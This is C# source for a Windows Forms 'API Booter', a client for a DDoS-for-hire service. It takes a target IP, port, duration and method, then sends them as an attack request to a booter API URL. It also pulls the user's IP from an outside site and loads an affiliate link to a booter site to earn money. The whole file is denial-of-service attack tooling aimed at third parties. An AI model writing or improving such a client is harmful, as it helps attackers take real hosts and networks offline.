﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

namespace API_Booter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        /*
         # Here we will setup our booter.
         # We will include:
         - API Link
         - Max + Min Time
         - API Key (If needed)
         */
        bool APIConnected = true;
        string MAXTime = "500";
        string MINTime = "1";
        string APIKey = "";
        int TimeLeft = 0;
        int TimeSince = 0;


        private void Form1_Load(object sender, EventArgs e)
        {
            WebClient web1 = new WebClient(); System.IO.Stream stream1 = web1.OpenRead("http://profoundsource.xyz/CF/clientIP.php");
            using (System.IO.StreamReader reader1 = new System.IO.StreamReader(stream1))
            {
                label8.Text = (reader1.ReadToEnd());
            }
            
            trackBar1.Maximum = Convert.ToInt32(MAXTime);
            trackBar1.Minimum = Convert.ToInt32(MINTime);
            timer1.Start();
            //Use an affliate 'click' link or something here, so atleast you can earn a dime when releasing something as 'free'
            webBrowser2.Navigate("http://boot4free.com/?aff=562aa117");
        }
        
        private void connectToAPIToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form2 API = new Form2();
            API.Show();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label4.Text = Convert.ToString(trackBar1.Value);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(!textBox1.Text.Contains("."))
                ConsoleWrite("Invalid IP!");
            if (textBox2.Text == "")
                ConsoleWrite("Invalid Port!");
            if (!APIConnected)
                ConsoleWrite("No API Found");

            if(comboBox1.Text != "UDP")
            {

            }

            else if(textBox1.Text.Contains(".") && textBox2.Text != "")
            {
                SendAttack(textBox1.Text, textBox2.Text, label4.Text, comboBox1.Text);
                webBrowser1.Navigate("http://MyBooter.com/api.php?apikey=" + APIKey + "&IP=" + textBox1.Text + "&Port=" + textBox2.Text + "&Time=" + label4.Text);
                timer3.Stop();
                label10.Text = "0";
                label9.Text = label4.Text;
                TimeLeft = Convert.ToInt16(label9.Text);
                timer2.Start();
            }
        }

        void ConsoleWrite(string Text)
        {
            richTextBox1.AppendText(Text);
            richTextBox1.AppendText(Environment.NewLine);
        }

        void SendAttack(string IP, string PORT, string TIME, string METHOD)
        {
            ConsoleWrite("Attack Sent:"); ConsoleWrite("IP: " + textBox1.Text + " - On Port:"+ textBox2.Text);
        }

        private void kEYIPPORTTIMEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("--------[Help]--------\n[1]", "Help");
        }

        private void label8_Click(object sender, EventArgs e)
        {
            textBox1.Text = label8.Text;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (TimeLeft != 0)
            {
                TimeLeft = TimeLeft - 1;
                label9.Text = Convert.ToString(TimeLeft);
            }
            else
            {
                timer2.Stop();
                timer3.Start();
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            TimeSince = Convert.ToInt16(label10.Text);
            TimeSince = TimeSince + 1;
            label10.Text = Convert.ToString(TimeSince);
        }
    }
}
